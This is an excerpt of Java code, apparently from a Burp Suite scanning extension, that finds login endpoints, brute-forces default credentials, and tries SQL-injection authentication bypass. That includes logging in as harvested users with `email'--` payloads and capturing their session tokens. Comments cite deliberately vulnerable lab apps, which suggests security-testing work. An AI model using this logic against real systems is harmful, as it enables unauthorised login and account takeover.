    // Password used for the auth-bypass / bootstrap attempts. A DISTINCTIVE, proper-length value (not "x"):
    // if the attempt happens to REGISTER an account (registration endpoints accept anything), the created
    // account's stored password is this string — so a downstream cleartext-password disclosure (/user_info
    // echoing the stored password) is detectable (length>=3, not a field-name/label). Generic, no app data.
    private static final String BOOTSTRAP_PW = "AiScan9zQ7v";

    /** Mine login endpoints from client code, probe each pre-auth, add to the site map, return the HRRs. */
    private List<HttpRequestResponse> probeAuthCandidates(String host) {
        List<HttpRequestResponse> out = new ArrayList<>();
        for (HttpRequest login : scanner.discoverAuthRequests(host)) {
            try {
                HttpRequestResponse rr = api.http().sendRequest(login,
                        RequestOptions.requestOptions().withResponseTimeout(12000L));
                if (rr == null || rr.response() == null) continue;
                try { api.siteMap().add(rr); } catch (Exception ignore) { }   // so auditAuthPages covers it
                scanLog.log("mined auth endpoint: " + login.method() + " " + hostOf(login.url())
                        + URI.create(login.url()).getPath() + " → HTTP " + rr.response().statusCode());
                out.add(rr);
            } catch (Exception ignore) { }
        }
        return out;
    }

    private void jsonCredsLogin(HttpRequestResponse loginRr) {
        try {
            HttpRequest base = loginRr.request();
            String body = base.bodyToString();
            String passKey = findJsonKey(body, PASS_PARAM);
            String userKey = findJsonKey(body, USER_PARAM);
            if (passKey == null) { scanLog.log("json-login: no password-like key in JSON body."); return; }
            // Scan-scoped guard (see defaultCredsLogin): run the JSON default-cred battery ONCE per endpoint. "json "
            // namespace so it's independent of the form batteries on the same url — each shape gets one attempt.
            if (!bruteforcedLogins.add("json " + base.url().split("\\?")[0])) {
                scanLog.log("json-login: skip " + base.url().split("\\?")[0]
                        + " — default-cred battery already run this scan.");
                return;
            }
            this.lastLoginReq = base;   // remember for the post-auth identity sweep
            scanLog.log("json-login: user='" + userKey + "' pass='" + passKey + "' on " + base.url());

            HttpRequestResponse bad = tryJsonLogin(base, userKey, "zzinvalid_ai_x", passKey, "zzinvalid_ai_x");
            // GATE (same as defaultCredsLogin): only brute an endpoint that behaves like a login. 404/405/415/501
            // → not a login handler; don't run the wordlist+bypass against it (avoids the 405-storm / 429 trips).
            int badSc = status(bad);
            if (badSc == 404 || badSc == 405 || badSc == 415 || badSc == 501 || badSc <= 0) {
                scanLog.log("json-login: skip " + base.url() + " — not a login handler (HTTP " + badSc + ").");
                return;
            }
            if (badSc == 429) { scanLog.log("json-login: " + base.url() + " already rate-limited (429) — skip."); return; }
            for (String[] cred : DEFAULT_CREDS) {
                HttpRequestResponse resp = tryJsonLogin(base, userKey, cred[0], passKey, cred[1]);
                int sc = status(resp);
                scanLog.log("    try " + cred[0] + "/" + cred[1] + " → HTTP "
                        + sc + ", " + bodyLen(resp) + "b");
                if (jsonLoginSuccess(resp, bad)) {
                    captureJsonSession(resp, hostOf(base.url()), cred[0], cred[1]);
                    return;
                }
                // Rate-limited: STOP (storming 429s poisons the legit register/login flow that follows).
                if (sc == 429) { scanLog.log("json-login: endpoint rate-limited (429) — stopping brute."); return; }
            }
            // No valid creds → try generic SQLi auth-bypass in the username/email field.
            for (String inj : AUTH_BYPASS) {
                HttpRequestResponse resp = tryJsonLogin(base, userKey, inj, passKey, BOOTSTRAP_PW);
                int scb = status(resp);
                scanLog.log("    try auth-bypass " + inj + " → HTTP " + scb);
                if (scb == 429) { scanLog.log("json-login: rate-limited (429) — stopping bypass probe."); return; }
                if (jsonLoginSuccess(resp, bad)) {
                    // A registration endpoint "accepts" any email (it CREATES an account) — that is not a SQLi
                    // auth-bypass, it is a signup. Only report the bypass on a real login endpoint (zero-FP);
                    // Pixi is MongoDB anyway, so a SQL payload never bypasses its login.
                    if (!isRegistrationEndpoint(base.url()))
                        scanLog.found("SQL injection (authentication bypass)", base.url(), userKey + "=" + inj);
                    captureJsonSession(resp, hostOf(base.url()), inj, BOOTSTRAP_PW);
                    return;
                }
            }
            scanLog.log("json-login: none of " + DEFAULT_CREDS.length + " combos (+ bypass) worked.");
        } catch (Exception ex) {
            scanLog.log("json-login failed: " + ex.getMessage());
        }
    }

    private static final Pattern EMAIL = Pattern.compile("[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}");

    /**
     * Identity sweep (generic, abstraction-bending but no hardcoded emails): harvest emails the app
     * exposed (captured responses + the common users collection), then for each try a SQLi
     * comment-login `<email>'--`. Each success logs us in AS that specific user server-side — which is
     * what trips identity-gated login challenges — without swapping our own session or hardcoding.
     */
    private void impersonateHarvestedIdentities(String host) {
        if (lastLoginReq == null) return;
        String body = lastLoginReq.bodyToString();
        String userKey = findJsonKey(body, USER_PARAM);
        String passKey = findJsonKey(body, PASS_PARAM);
        if (userKey == null || passKey == null) return;
        Set<String> emails = harvestEmails(host);
        if (emails.isEmpty()) return;
        scanLog.log("identity sweep: SQLi comment-login for " + emails.size() + " harvested email(s)…");
        int got = 0;
        for (String email : emails) {
            try {
                HttpRequestResponse r = tryJsonLogin(lastLoginReq, userKey, email + "'--", passKey, "x");
                if (r != null && r.response() != null && JSON_TOKEN.matcher(r.response().bodyToString()).find()
                        && !isRegistrationEndpoint(lastLoginReq.url())) {
                    got++;
                    scanLog.found("SQL injection (login as specific user)", lastLoginReq.url(), userKey + "=" + email + "'--");
                }
            } catch (Exception ignore) { }
        }
        scanLog.log("identity sweep: authenticated as " + got + "/" + emails.size() + " harvested identity(ies).");
    }

    /** Emails the app exposed: from captured in-scope responses + the common /api/Users collection. */
    private Set<String> harvestEmails(String host) {
        Set<String> out = new java.util.LinkedHashSet<>();
        try {
            for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                if (rr.response() == null || !host.equalsIgnoreCase(hostOf(rr.request().url()))) continue;
                Matcher m = EMAIL.matcher(rr.response().bodyToString());
                while (m.find() && out.size() < 60) out.add(m.group().toLowerCase());
            }
            String root = URI.create(lastLoginReq.url()).getScheme() + "://" + URI.create(lastLoginReq.url()).getAuthority();
            HttpRequest u = HttpRequest.httpRequestFromUrl(root + "/api/Users").withMethod("GET");
            if (session.has()) u = u.withHeader("Cookie", session.cookieHeader());
            if (session.hasBearer()) u = u.withHeader("Authorization", "Bearer " + session.bearer());
            HttpRequestResponse rr = api.http().sendRequest(u, RequestOptions.requestOptions().withResponseTimeout(12000L));
            if (rr != null && rr.response() != null) {
                Matcher m = EMAIL.matcher(rr.response().bodyToString());
                while (m.find() && out.size() < 100) out.add(m.group().toLowerCase());
            }
        } catch (Exception ignore) { }
        return out;
    }

    private HttpRequestResponse tryJsonLogin(HttpRequest base, String userKey, String user, String passKey, String pass) {
        String body = base.bodyToString();
        if (userKey != null) body = replaceJsonValue(body, userKey, user);
        body = replaceJsonValue(body, passKey, pass);
        HttpRequest req = base.withBody(body);
        return api.http().sendRequest(req, RequestOptions.requestOptions().withResponseTimeout(12000L));
    }

    private static String replaceJsonValue(String body, String key, String value) {
        String esc = value.replace("\\", "\\\\").replace("\"", "\\\"");
        return body.replaceAll("(\"" + Pattern.quote(key) + "\"\\s*:\\s*)\"(?:[^\"\\\\]|\\\\.)*\"",
                "$1\"" + Matcher.quoteReplacement(esc) + "\"");
    }

    /** Success: a token was issued, a new session cookie appeared, or a clean 200 vs the failed attempt. */
    private boolean jsonLoginSuccess(HttpRequestResponse resp, HttpRequestResponse bad) {
        if (resp == null || resp.response() == null) return false;
        if (JSON_TOKEN.matcher(resp.response().bodyToString()).find()) return true;
        Set<String> badCookies = cookieNames(bad);
        for (Cookie c : resp.response().cookies()) {
            if (SESSION_COOKIE.matcher(c.name()).matches() && !badCookies.contains(c.name())
                    && c.value() != null && !c.value().isBlank()) return true;
        }
        return status(resp) == 200 && status(bad) != 200;
    }

    private void captureJsonSession(HttpRequestResponse resp, String host, String user, String pass) {
        Matcher m = JSON_TOKEN.matcher(resp.response().bodyToString());
        if (m.find()) {
            session.setBearer(m.group(1));
            scanLog.log("json-login: bearer token captured (" + m.group(1).length()
                    + " chars) — scans now authenticated");
        }
        String cookieHeader = buildCookieHeader(resp);
        if (!cookieHeader.isBlank()) {
            session.set(cookieHeader);
            for (Cookie c : resp.response().cookies()) {
                try {
                    api.http().cookieJar().setCookie(c.name(), c.value(), "/", host, ZonedDateTime.now().plusDays(1));
                } catch (Exception ignore) { }
            }
        }
        String loginUrl = resp.request().url();
        if (!isRegistrationEndpoint(loginUrl)) {
            scanLog.found("Default/Weak Credentials", loginUrl, user + "/" + pass, resp);
            scanLog.log("default creds WORK (JSON login): " + user + " / " + pass);
        } else {
            scanLog.log("registered a throwaway account via " + loginUrl
                    + " → session bootstrapped (registration, not a weak-cred finding)");
        }
        session.rememberLogin(loginUrl, user, pass);
    }

    /**
     * Heuristic login success, robust to redirect-based logins (Zero Bank etc. answer
     * 302/empty-body on BOTH success and failure). Signals, strongest first:
     *   1) a new session cookie appeared that the failed attempt didn't set;
     *   2) the redirect target (Location) diverges from the failed attempt and isn't an
     *      error/login bounce (e.g. -> /index.html vs -> /login.html?login_error=true);
     *   3) status/body diverged without an obvious error string (non-redirect logins).
     */
    private static boolean looksLikeSuccess(HttpRequestResponse resp, HttpRequestResponse bad,
                                            String user, String pass) {
        if (resp == null || resp.response() == null) return false;
        var r = resp.response();

        // Strongest signal: a NEW session cookie the failed attempt didn't set → definitively authenticated —
        // BUT only on a NON-ERROR response. Django emits a sessionid/csrftoken cookie even on a 500 (allauth
        // /accounts/signup email-verify misconfig 500s while still Set-Cookie'ing) — that is NOT a successful
        // auth. Treating it as one false-succeeds and short-circuits the working register path (PyGoat: allauth
        // signup 500s, but the custom /register 302s straight to an authenticated session). A real login/register
        // returns 2xx or a 3xx redirect, never 4xx/5xx.
        Set<String> badCookies = cookieNames(bad);
        if (r.statusCode() < 400) for (Cookie c : r.cookies()) {
            if (SESSION_COOKIE.matcher(c.name()).matches() && !badCookies.contains(c.name())
                    && c.value() != null && !c.value().isBlank()) {
                return true;
            }
        }

        // Without a gained session, a BLANK password is never a credible valid credential — a bare redirect
        // on an empty password is a form-validation bounce, not authentication (kills the Pixi
        // /register?user=<x> FP where a missing field 302s straight back to the form).
        if (pass == null || pass.isBlank()) return false;

        String loc = location(resp);
        String badLoc = location(bad);
        if (loc != null && !loc.isBlank()) {
            String ll = loc.toLowerCase();
            // register/signup added: you never LAND on the signup page after a successful login.
            boolean errorBounce = ll.matches("(?s).*(login|signin|sign-in|error|denied|invalid|logout|register|signup).*");
            // Form re-display bounce: the redirect echoes the submitted username back as a QUERY-STRING value
            // (e.g. /register?user=admin, /login?email=admin) — that is the form redisplaying, not a login. Only
            // the query is inspected: a username that merely appears in the PATH is not an echo (WordPress's
            // success redirect /wp-admin/ contains "admin" but is the authenticated destination, not a bounce).
            String q = ll.contains("?") ? ll.substring(ll.indexOf('?')) : "";
            boolean echoesUser = user != null && !user.isBlank() && q.contains(user.toLowerCase());
            if (!errorBounce && !echoesUser && (badLoc == null || !loc.equalsIgnoreCase(badLoc))) return true;
        }

        // A successful login returns 2xx (a redirect to a non-error page is handled above), NEVER another
        // 4xx/5xx. Treating ANY status change as success FP'd here: a rate-limited 429 (400→429) or a blocked
        // 403 differs from the failing baseline without any authentication happening, and "no cookie captured".
        // So the differential branch requires a 2xx, and the error/blocked wording covers rate-limit/captcha.
        int st = r.statusCode();
        if (st < 200 || st >= 300) return false;
        int badStatus = status(bad), badLen = bodyLen(bad);
        boolean statusChanged = st != badStatus;
        boolean bodyChanged = badLen >= 0 && Math.abs(bodyLen(resp) - badLen) > 100;
        boolean noObviousError = !r.bodyToString().toLowerCase()
                .matches("(?s).*(invalid|incorrect|wrong|failed|denied|try again|bad credentials|too many|rate.?limit|locked|captcha|forbidden).*");
        return (statusChanged || bodyChanged) && noObviousError;
    }

    private static String location(HttpRequestResponse rr) {
        try { return rr != null && rr.response() != null ? rr.response().headerValue("Location") : null; }
        catch (Exception e) { return null; }
    }

    /** A path that CREATES an account (register/signup): authenticating through it bootstraps a session but is
     *  NOT a default/weak-credential finding — any input "works" because it registers a NEW user, not because
     *  weak stored credentials were guessed. Generic (no app-specific paths). */
    private static boolean isRegistrationEndpoint(String url) {
        if (url == null) return false;
        String p = url.toLowerCase();
        int q = p.indexOf('?'); if (q >= 0) p = p.substring(0, q);
        return p.matches("(?s).*(register|signup|sign-up|/join|create[_-]?account|users/new).*");
    }

    private static String locSuffix(HttpRequestResponse rr) {
        String l = location(rr);
        return (l == null || l.isBlank()) ? "" : " → Location: " + l;
    }

    private static int status(HttpRequestResponse rr) {
        return rr != null && rr.response() != null ? rr.response().statusCode() : -1;
    }
    private static int bodyLen(HttpRequestResponse rr) {
        return rr != null && rr.response() != null ? rr.response().body().length() : -1;
    }
    private static Set<String> cookieNames(HttpRequestResponse rr) {
        Set<String> s = new HashSet<>();
        if (rr != null && rr.response() != null) for (Cookie c : rr.response().cookies()) s.add(c.name());
        return s;
    }
    private static String buildCookieHeader(HttpRequestResponse rr) {
        if (rr == null || rr.response() == null) return "";
        // A response can Set-Cookie the SAME name several times in one response (phpMyAdmin re-sets its session
        // cookie mid-GET; many apps overwrite a cookie they just set). A browser/cookie-jar keeps only the LAST
        // value per name (RFC 6265). Emitting all of them yields DUPLICATE, conflicting cookies and the server
        // then picks the wrong one — which silently breaks session/CSRF-token-bound logins. Dedup by name,
        // last-wins. Generic cookie hygiene, not app-specific.
        java.util.LinkedHashMap<String, String> jar = new java.util.LinkedHashMap<>();
        for (Cookie c : rr.response().cookies()) jar.put(c.name(), c.value());   // later Set-Cookie of a name wins
        StringBuilder sb = new StringBuilder();
        for (Map.Entry<String, String> e : jar.entrySet()) {
            if (sb.length() > 0) sb.append("; ");
            sb.append(e.getKey()).append('=').append(e.getValue());
        }
        return sb.toString();
    }

    /** Authenticated cookie jar = the Cookie we SENT on the login POST (the fresh session id) merged with any
     *  Set-Cookie the response returned (a regenerated id wins). buildCookieHeader alone misses the case where a
     *  successful login returns NO Set-Cookie because the sent session id is simply marked authenticated. */
    private static String mergedAuthCookie(HttpRequestResponse resp) {
        java.util.LinkedHashMap<String, String> jar = new java.util.LinkedHashMap<>();
        String sent = (resp != null && resp.request() != null) ? resp.request().headerValue("Cookie") : null;
        if (sent != null) for (String kv : sent.split(";")) { int i = kv.indexOf('='); if (i > 0) jar.put(kv.substring(0, i).trim(), kv.substring(i + 1).trim()); }
        if (resp != null && resp.response() != null) for (Cookie c : resp.response().cookies()) jar.put(c.name(), c.value());
        StringBuilder sb = new StringBuilder();
        for (Map.Entry<String, String> e : jar.entrySet()) { if (sb.length() > 0) sb.append("; "); sb.append(e.getKey()).append('=').append(e.getValue()); }
        return sb.toString();
    }

    private void captureSession(HttpRequestResponse resp, HttpRequestResponse evidence, String host,
                               String user, String pass) {
        String cookieHeader = mergedAuthCookie(resp);
        if (!cookieHeader.isBlank()) {
            session.set(cookieHeader);
            // Seed Burp's cookie jar from the MERGED authenticated jar (not just this response's Set-Cookie), so
            // Burp's native crawl + active audit run authenticated too.
            for (String kv : cookieHeader.split(";")) {
                int i = kv.indexOf('='); if (i <= 0) continue;
                try { api.http().cookieJar().setCookie(kv.substring(0, i).trim(), kv.substring(i + 1).trim(), "/", host, ZonedDateTime.now().plusDays(1)); } catch (Exception ignore) { }
            }
        }
        // Remember where the login redirected us — the authenticated landing page is the
        // seed of the NEW surface that only appears once logged in.
        String loc = location(resp);
        if (loc != null && !loc.isBlank()) {
            try {
                String abs = URI.create(evidence.request().url()).resolve(loc).toString();
                session.setLandingUrl(abs);
                scanLog.log("authenticated landing: " + abs);
                // FINALIZE the session: follow the post-login redirect chain (e.g. Zero Bank's
                // /auth/accept-certs.html?user_token=…). Without this the session is half-baked and
                // protected pages (/bank/*) bounce back to login — blocking the authenticated audit.
                finalizeSession(abs, host);
            } catch (Exception ignore) { }
        }

        // found(...) now raises the dashboard AuditIssue itself (via ScanLog's issue sink), with the
        // offending request/response attached — so no separate raiseIssue() call is needed.
        String loginUrl = evidence.request().url();
        if (!isRegistrationEndpoint(loginUrl)) {
            scanLog.found("Default/Weak Credentials", loginUrl, user + "/" + pass, evidence);
            scanLog.log("default creds WORK: " + user + " / " + pass
                    + (session.has() ? " — session captured, scans now authenticated" : " (no cookie captured)"));
        } else {
            scanLog.log("registered account via " + loginUrl + " → session "
                    + (session.has() ? "captured" : "attempted")
                    + " (registration bootstrap, not a weak-cred finding)");
        }
    }

    /**
     * GET the post-login landing and follow its redirect chain carrying the session cookie,
     * merging any Set-Cookie along the way — this completes multi-step logins (token/cert-accept
     * steps) so the session is valid for the protected area.
     */
    private void finalizeSession(String startUrl, String host) {
        String url = startUrl;
        java.util.Set<String> seen = new java.util.HashSet<>();
        for (int hop = 0; hop < 8; hop++) {
            // Loop guard: an HTTP->HTTPS / cert-accept interstitial (e.g. Zero Bank /auth/accept-certs.html)
            // can 302 to itself forever. Break instead of silently burning hops, and say so.
            if (!seen.add(stripFragment(url))) {
                scanLog.log("post-login chain LOOPED at " + url + " — likely an HTTP->HTTPS or "
                        + "cert-accept interstitial; the authenticated area may sit behind it (no landing to seed).");
                return;
            }
            HttpRequestResponse rr;
            try {
                HttpRequest req = HttpRequest.httpRequestFromUrl(url).withMethod("GET");
                if (session.has()) req = req.withHeader("Cookie", session.cookieHeader());
                rr = api.http().sendRequest(req, RequestOptions.requestOptions().withResponseTimeout(12000L));
            } catch (Exception e) { return; }
            if (rr == null || rr.response() == null) return;

            // merge any new session cookies the step set, and push them to Burp's cookie jar
            String fresh = buildCookieHeader(rr);
            if (!fresh.isBlank()) {
                session.set(mergeCookies(session.cookieHeader(), fresh));
                for (Cookie c : rr.response().cookies()) {
                    try {
                        api.http().cookieJar().setCookie(c.name(), c.value(), "/", host, ZonedDateTime.now().plusDays(1));
                    } catch (Exception ignore) { }
                }
            }
            int st = rr.response().statusCode();
            if (st < 300 || st >= 400) {
                // Terminal page. Promote a real 2xx landing that is NOT itself an auth/cert step as the authed-
                // explore seed — otherwise the explorer seeds at the login/interstitial dead-end and never
                // discovers the post-login nav (missing the whole transactional surface).
                if (st >= 200 && st < 300 && !isAuthStep(url)) {
                    session.setLandingUrl(url);
                    scanLog.log("authenticated landing promoted to post-login page: " + url);
                }
                scanLog.log("session finalized (followed post-login chain, HTTP " + st + " @ " + url + ")");
                return;
            }
            // 3xx: follow the Location, resolving relative AND crossing http->https (the authed area is often TLS).
            String next = location(rr);
            if (next == null || next.isBlank()) return;
            try { url = URI.create(url).resolve(next).toString(); } catch (Exception e) { return; }
        }
        scanLog.log("post-login chain did not resolve to a usable landing within 8 hops (last: " + url + ").");
    }

    private static String stripFragment(String u) { int h = u == null ? -1 : u.indexOf('#'); return h < 0 ? u : u.substring(0, h); }
    private static boolean isAuthStep(String u) {
        return u != null && u.toLowerCase().matches("(?s).*(login|signin|sign-in|logon|logout|accept-certs|/auth/|cert).*");
    }

    /** Merge two "Cookie:" header strings by name (incoming wins). */
    private static String mergeCookies(String existing, String incoming) {
        LinkedHashMap<String, String> jar = new LinkedHashMap<>();
        for (String part : (existing == null ? "" : existing).split(";")) {
            String s = part.trim(); int eq = s.indexOf('=');
            if (eq > 0) jar.put(s.substring(0, eq).trim(), s.substring(eq + 1).trim());
        }
        for (String part : (incoming == null ? "" : incoming).split(";")) {
            String s = part.trim(); int eq = s.indexOf('=');
            if (eq > 0) jar.put(s.substring(0, eq).trim(), s.substring(eq + 1).trim());
        }
        StringBuilder sb = new StringBuilder();
        for (Map.Entry<String, String> e : jar.entrySet()) {
            if (sb.length() > 0) sb.append("; ");
            sb.append(e.getKey()).append('=').append(e.getValue());
        }
        return sb.toString();
    }

    private static boolean responseHasPasswordForm(HttpRequestResponse rr) {
        if (rr.response() == null) return false;
        return Pattern.compile("(?is)<input\\b[^>]*type\\s*=\\s*[\"']?password")
                .matcher(rr.response().bodyToString()).find();
    }

    /**
     * Re-establish the session by replaying the winning login (fresh page → fresh CSRF token →
     * POST winning creds). Needed because Burp's authenticated crawl can hit a logout link and
     * kill the server-side session mid-scan; we call this right before the authenticated explorer.
     */
    private void reauthenticate() {
        if (!session.canReauth()) return;
        String pageUrl = session.loginPageUrl();
        HttpRequestResponse fresh = getFresh(pageUrl, null);
        if (fresh == null || fresh.response() == null) return;
        String cookie = buildCookieHeader(fresh);
        String html = fresh.response().bodyToString();
        Matcher fm = Pattern.compile("(?is)<form\\b.*?</form>").matcher(html);
        while (fm.find()) {
            String form = fm.group();
            if (!Pattern.compile("(?is)<input\\b[^>]*type\\s*=\\s*[\"']?password").matcher(form).find()) continue;
            String formTag = form.substring(0, form.indexOf('>') + 1);
            String action = attr(formTag, "action");
            String actionUrl;
            try { actionUrl = (action == null || action.isBlank()) ? pageUrl : URI.create(pageUrl).resolve(action).toString(); }
            catch (Exception e) { actionUrl = pageUrl; }
            Map<String, String> fields = new LinkedHashMap<>();
            String userField = null, passField = null;
            Matcher im = Pattern.compile("(?is)<input\\b[^>]*>").matcher(form);
            while (im.find()) {
                String tag = im.group();
                String name = attr(tag, "name");
                if (name == null || name.isBlank()) continue;
                String type = attr(tag, "type");
                String value = attr(tag, "value");
                fields.put(name, value == null ? "" : value);
                if (passField == null && "password".equalsIgnoreCase(type)) passField = name;
                else if (userField == null && USER_PARAM.matcher(name).matches()) userField = name;
            }
            if (passField == null) continue;
            if (userField == null) for (String n : fields.keySet()) if (!n.equals(passField)) { userField = n; break; }
            HttpRequestResponse resp = postForm(actionUrl, null, fields, userField, session.loginUser(),
                    passField, session.loginPass(), cookie);
            String sc = buildCookieHeader(resp);
            scanLog.log("re-login → HTTP " + status(resp) + locSuffix(resp)
                    + "  | Set-Cookie: " + (sc.isBlank() ? "(none)" : sc));
            if (!sc.isBlank()) {
                session.set(sc);
                // keep Burp's cookie jar in sync — a stale (post-logout) JSESSIONID there can otherwise
                // override our explicit Cookie header on api.http().sendRequest.
                String h = hostOf(actionUrl);
                for (Cookie c : resp.response().cookies()) {
                    try { api.http().cookieJar().setCookie(c.name(), c.value(), "/", h, ZonedDateTime.now().plusDays(1)); }
                    catch (Exception ignore) { }
                }
                scanLog.log("session re-established + cookie jar synced");
                // Complete any POST-LOGIN interstitial the login POST redirected to (e.g. Zero Bank
                // /auth/accept-certs.html → /auth/security-check.html) carrying the fresh cookie — otherwise the
                // session is only half-primed and authenticated POSTs later 302 to login. Bounded; http-forced
                // (the https variant is a broken stub on some hosts). Merges any cookie each hop sets. Generic.
                String loc = resp.response() != null ? resp.response().headerValue("Location") : null;
                String cur = actionUrl;
                for (int hop = 0; hop < 5 && loc != null && !loc.isBlank(); hop++) {
                    try {
                        cur = URI.create(cur).resolve(loc).toString().replaceFirst("^https://", "http://");
                        HttpRequestResponse hopRr = getFreshAuthed(cur);
                        if (hopRr == null || hopRr.response() == null) break;
                        String sc2 = buildCookieHeader(hopRr);
                        if (!sc2.isBlank()) { session.set(sc2);
                            for (Cookie c : hopRr.response().cookies())
                                try { api.http().cookieJar().setCookie(c.name(), c.value(), "/", h, ZonedDateTime.now().plusDays(1)); } catch (Exception ignore) {}
                        }
                        int hc = hopRr.response().statusCode();
                        loc = (hc >= 300 && hc < 400) ? hopRr.response().headerValue("Location") : null;
                    } catch (Exception e) { break; }
                }
                // verify: does a protected page load with the fresh session? (definitive signal)
                HttpRequestResponse v = getFreshAuthed(firstProtectedUrl(h));
                if (v != null && v.response() != null) {
                    scanLog.log("  verify protected page → HTTP " + status(v) + locSuffix(v));
                }
            }
            return;
        }
    }

    /** Parse an HTML login form, then log in carrying a fresh session cookie + CSRF token. */
    private void loginViaForm(String pageUrl, HttpService svc) {
        // Fetch the login page FRESH to obtain a live session cookie and a current CSRF token,
        // then submit the POST carrying that cookie — otherwise CSRF/session checks reject us.
        HttpRequestResponse fresh = getFresh(pageUrl, svc);
        if (fresh == null || fresh.response() == null) return;
        String cookie = buildCookieHeader(fresh);
        String html = fresh.response().bodyToString();

        Matcher fm = Pattern.compile("(?is)<form\\b.*?</form>").matcher(html);
        while (fm.find()) {
            String form = fm.group();
            if (!Pattern.compile("(?is)<input\\b[^>]*type\\s*=\\s*[\"']?password").matcher(form).find()) continue;

            String formTag = form.substring(0, form.indexOf('>') + 1);
            String action = attr(formTag, "action");
            // Pseudo-scheme actions (action="javascript:getToken()" on JS-driven forms, mailto:/tel:/data:) are not
            // navigable — the real submit target is JS-driven. Posting to them throws "Invalid data" and aborted the
            // whole scan; the form itself submits to its own page, so resolve to pageUrl instead. Generic.
            if (action != null && (action.regionMatches(true, 0, "javascript:", 0, 11)
                    || action.regionMatches(true, 0, "mailto:", 0, 7)
                    || action.regionMatches(true, 0, "tel:", 0, 4)
                    || action.regionMatches(true, 0, "data:", 0, 5))) action = null;
            String actionUrl;
            try {
                actionUrl = (action == null || action.isBlank()) ? pageUrl
                        : URI.create(pageUrl).resolve(action).toString();
            } catch (Exception e) { actionUrl = pageUrl; }
            if (!actionUrl.startsWith("http://") && !actionUrl.startsWith("https://")) actionUrl = pageUrl;

            Map<String, String> fields = new LinkedHashMap<>();
            String userField = null, passField = null;
            Matcher im = Pattern.compile("(?is)<input\\b[^>]*>").matcher(form);
            while (im.find()) {
                String tag = im.group();
                String name = attr(tag, "name");
                if (name == null || name.isBlank()) continue;
                String type = attr(tag, "type");
                String value = attr(tag, "value");
                fields.put(name, value == null ? "" : value);   // preserves hidden CSRF token values
                if (passField == null && "password".equalsIgnoreCase(type)) passField = name;
                else if (userField == null && USER_PARAM.matcher(name).matches()) userField = name;
            }
            if (passField == null) continue;
            if (userField == null) {
                for (String n : fields.keySet()) if (!n.equals(passField)) { userField = n; break; }
            }
            // Dedup: the SAME login action reached via many pages (phpMyAdmin shows the form on every route) is
            // brute-forced ONCE — not 15 creds × N pages.
            if (!bruteforcedLogins.add(actionUrl.split("\\?")[0])) continue;
            // A single-use CSRF token → each attempt must carry a FRESH one (re-GET per attempt), or every cred
            // after the first is rejected on a stale token (the phpMyAdmin false-negative: root/password "failed").
            boolean csrf = fields.keySet().stream().anyMatch(n -> CSRF_FIELD.matcher(n).find());
            scanLog.log("login form @ " + pageUrl + " → POST " + actionUrl
                    + " (user='" + userField + "', pass='" + passField + "'"
                    + (cookie.isBlank() ? "" : ", session cookie carried") + (csrf ? ", per-attempt CSRF token" : "") + ")");

            final String uf = userField, pf = passField;
            HttpRequestResponse bad = csrf
                    ? attemptFresh(pageUrl, actionUrl, svc, uf, pf, "zzinvalid_ai_x", "zzinvalid_ai_x")
                    : postForm(actionUrl, svc, fields, uf, "zzinvalid_ai_x", pf, "zzinvalid_ai_x", cookie);
            scanLog.log("  baseline (bad creds): HTTP " + status(bad) + ", " + bodyLen(bad) + "b" + locSuffix(bad));
            // Record the login POST (with the real user/pass field names) into the site map so the auth-page audit
            // (auditAuthPages) has a fuzzable login request. AuthSession's own POSTs aren't recorded, so login SQLi
            // AND NoSQL auth-bypass ($ne/$gt) had no request to test — the headline vuln on Node/Mongo login
            // endpoints (goof, secDevLabs/mongection). Adding the bad-creds baseline is enough (probes mutate the
            // field values). Generic; harmless if the send failed.
            if (bad != null && bad.request() != null) { try { api.siteMap().add(bad); } catch (Throwable ignore) { } }
            for (String[] cred : DEFAULT_CREDS) {
                HttpRequestResponse resp = csrf
                        ? attemptFresh(pageUrl, actionUrl, svc, uf, pf, cred[0], cred[1])
                        : postForm(actionUrl, svc, fields, uf, cred[0], pf, cred[1], cookie);
                scanLog.log("    try " + cred[0] + "/" + cred[1] + " → HTTP "
                        + status(resp) + ", " + bodyLen(resp) + "b" + locSuffix(resp));
                if (looksLikeSuccess(resp, bad, cred[0], cred[1])) {
                    // Evidence: ALWAYS the successful login POST (that's what proves the finding).
                    session.rememberLogin(pageUrl, cred[0], cred[1]);   // enable re-auth if crawl logs us out
                    captureSession(resp, resp, hostOf(actionUrl), cred[0], cred[1]);
                    return;
                }
                if (status(resp) == 429) { scanLog.log("default-creds: endpoint rate-limited (429) — stopping."); return; }
            }
            scanLog.log("login form: none of " + DEFAULT_CREDS.length
                    + " default combos worked @ " + actionUrl);
        }
    }

    /** One form-login attempt with a FRESH single-use CSRF token: re-GET the login page (new token + cookie),
     *  re-read the password form's hidden fields, and submit. Needed for phpMyAdmin/DVWA/Rails-style tokens. */
    private HttpRequestResponse attemptFresh(String pageUrl, String actionUrl, HttpService svc,
                                             String userField, String passField, String user, String pass) {
        HttpRequestResponse fr = getFresh(pageUrl, svc);
        if (fr == null || fr.response() == null) return null;
        String cookie = buildCookieHeader(fr);
        Map<String, String> fields = passwordFormFields(fr.response().bodyToString());
        if (fields == null) return null;
        return postForm(actionUrl, svc, fields, userField, user, passField, pass, cookie);
    }

    /** name→value of the first password-bearing form's inputs (a FRESH CSRF token included). */
    private static Map<String, String> passwordFormFields(String html) {
        if (html == null) return null;
        Matcher fm = Pattern.compile("(?is)<form\\b.*?</form>").matcher(html);
        while (fm.find()) {
            String form = fm.group();
            if (!Pattern.compile("(?is)<input\\b[^>]*type\\s*=\\s*[\"']?password").matcher(form).find()) continue;
            Map<String, String> fields = new LinkedHashMap<>();
            Matcher im = Pattern.compile("(?is)<input\\b[^>]*>").matcher(form);
            while (im.find()) {
                String name = attr(im.group(), "name");
                if (name == null || name.isBlank()) continue;
                String value = attr(im.group(), "value");
                fields.put(name, value == null ? "" : value);
            }
            return fields;
        }
        return null;
    }

    private HttpRequestResponse getFresh(String url, HttpService svc) {
        try {
            HttpRequest req = HttpRequest.httpRequestFromUrl(url).withMethod("GET");
            if (req.httpService() == null && svc != null) req = req.withService(svc);
            return api.http().sendRequest(req, RequestOptions.requestOptions().withResponseTimeout(12000L));
        } catch (Exception e) {
            return null;
        }
    }

    /** GET a URL carrying the captured session cookie — used to verify the session is live. */
    private HttpRequestResponse getFreshAuthed(String url) {
        if (url == null || url.isBlank()) return null;
        try {
            HttpRequest req = HttpRequest.httpRequestFromUrl(url).withMethod("GET");
